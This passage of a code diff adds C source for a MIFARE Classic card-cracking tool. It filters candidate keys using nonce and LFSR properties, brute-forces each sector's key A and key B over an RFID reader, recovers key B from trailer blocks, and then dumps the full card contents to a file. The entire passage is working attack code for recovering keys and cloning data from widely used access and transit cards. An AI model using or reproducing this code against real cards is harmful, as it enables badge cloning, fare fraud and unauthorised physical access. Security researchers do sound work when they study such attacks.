+                    candidates_a[i] = candidates_a[l];
+                    candidates_a[l++] = key;
+                }
+            }
+
+            // Bruteforce
+            for (size_t i = 0; i < candidates_a_len; i++)
+            {
+                printf("\rBruteforcing sector %02d, key A (%10zu / %zu)  ", s, i + 1, candidates_a_len);
+                fflush(stdout);
+
+                if (mf_auth(MC_AUTH_A, SEC_TO_TRAILER(s), candidates_a[i], auth_uid))
+                {
+                    keys_a[s].found = true;
+                    keys_a[s].key = candidates_a[i] & 0xFFFFFFFFFFFF;
+
+                    if (!keys_b[s].found)
+                    {
+                        uint8_t block[16];
+
+                        // Try again to read key B
+                        if (mf_read(SEC_TO_TRAILER(s), block))
+                        {
+                            uint64_t read_key = bytes_to_num(block + 10, 6);
+
+                            if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), read_key, auth_uid))
+                            {
+                                keys_b[s].found = true;
+                                keys_b[s].key = read_key;
+                            }
+                        }
+                    }
+
+                    break;
+                }
+            }
+
+            printf("Done\n");
+            free(candidates_a);
+        }
+
+        if (!keys_b[s].found)
+        {
+            for (size_t l = 0, i = 0; i < candidates_b_len; i++)
+            {
+                uint64_t key = candidates_b[i];
+                uint16_t seed = key >> 48;
+
+                if (keys_a[s].found ?
+                    seed == compute_seednt16_nt32(keys_a[s].nt, keys_a[s].key) :
+                    lfsr16_common[seed] & 0b10)
+                {
+                    candidates_b[i] = candidates_b[l];
+                    candidates_b[l++] = key;
+                }
+            }
+
+            for (size_t i = 0; i < candidates_b_len; i++)
+            {
+                printf("\rBruteforcing sector %02d, key B (%10zu / %zu)  ", s, i + 1, candidates_b_len);
+                fflush(stdout);
+
+                if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), candidates_b[i], auth_uid))
+                {
+                    keys_b[s].found = true;
+                    keys_b[s].key = candidates_b[i] & 0xFFFFFFFFFFFF;
+                    break;
+                }
+            }
+
+            printf("Done\n");
+            free(candidates_b);
+        }
+    }
+
+    printf("\n");
+
+    printf("Sector | Key A        | Key B        |\n");
+    printf("-------+--------------+--------------+\n");
+    for (uint8_t s = 0; s < num_sectors; s++)
+    {
+        printf("%02d     | ", s);
+        printf(keys_a[s].found ? "%012llX | " : "             | ", keys_a[s].key);
+        printf(keys_b[s].found ? "%012llX | " : "             | ", keys_b[s].key);
+        printf("\n");
+    }
+    printf("\n");
+
+    uint8_t blocks[MAX_BLOCK_CNT][16] = { 0 };
+
+    // Dump card data
+    for (uint8_t i = 0, s = 0; s < num_sectors; s++)
+    {
+        printf("\rDumping all card contents... (sector %02d)  ", s);
+        fflush(stdout);
+
+        // Authenticate sector
+        if (keys_a[s].found)
+            mf_auth(MC_AUTH_A, SEC_TO_TRAILER(s), keys_a[s].key, auth_uid);
+        else if (keys_b[s].found)
+            mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), keys_b[s].key, auth_uid);
+        else
+            i = SEC_TO_TRAILER(s) + 1;
+
+        // Read all blocks in sector
+        for (; i <= SEC_TO_TRAILER(s); i++)
+            mf_read(i, blocks[i]);
+
+        // Copy keys into trailer blocks
+        num_to_bytes(blocks[SEC_TO_TRAILER(s)], keys_a[s].key, 6);
+        num_to_bytes(blocks[SEC_TO_TRAILER(s)] + 10, keys_b[s].key, 6);
+    }
+
+    printf("\n\n");
+
+    printf("Block | Data (Unknown = 00)              |\n");
+    printf("------+----------------------------------+\n");
+    for (size_t i = 0; i < num_blocks; i++)
+    {
+        printf("%03d   | ", i);
+        for (uint8_t u = 0; u < 16; u++)
+            printf("%02X", blocks[i][u]);
+        printf(" |\n");
+    }
+    printf("\n");
+
+    if (fp_out != NULL)
+    {
+        size_t res = fwrite(blocks, 1, num_blocks * sizeof(*blocks), fp_out);
+        if (res != num_blocks * sizeof(*blocks))
+        {
+            fprintf(stderr, "Error, cannot write data back to file\n");
+            exit(EXIT_FAILURE);
+        }
+        fclose(fp_out);
+    }
+
+    exit(EXIT_SUCCESS);
 }
